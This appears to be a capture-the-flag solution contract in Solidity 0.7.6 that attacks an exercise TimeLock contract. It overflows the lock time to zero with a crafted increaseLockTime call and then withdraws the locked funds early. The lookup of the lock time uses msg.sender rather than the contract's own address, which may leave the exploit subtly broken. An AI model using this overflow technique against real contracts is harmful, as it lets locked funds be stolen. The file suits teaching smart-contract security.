//SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "../N3-TimeLock-easy.sol";

contract N3TimeLockHack {

    N3TimeLock challenge;
    // You can declare whatever you need, here

    constructor(N3TimeLock _challenge) public {
        challenge = _challenge;
    }

    function pwn() payable public {
        uint256 cur_locktime = challenge.lockTime(msg.sender);
        uint256 to_increase = type(uint256).max - cur_locktime + 1;
        challenge.increaseLockTime(to_increase);
        challenge.withdraw();
    }

    receive() external payable {}
}
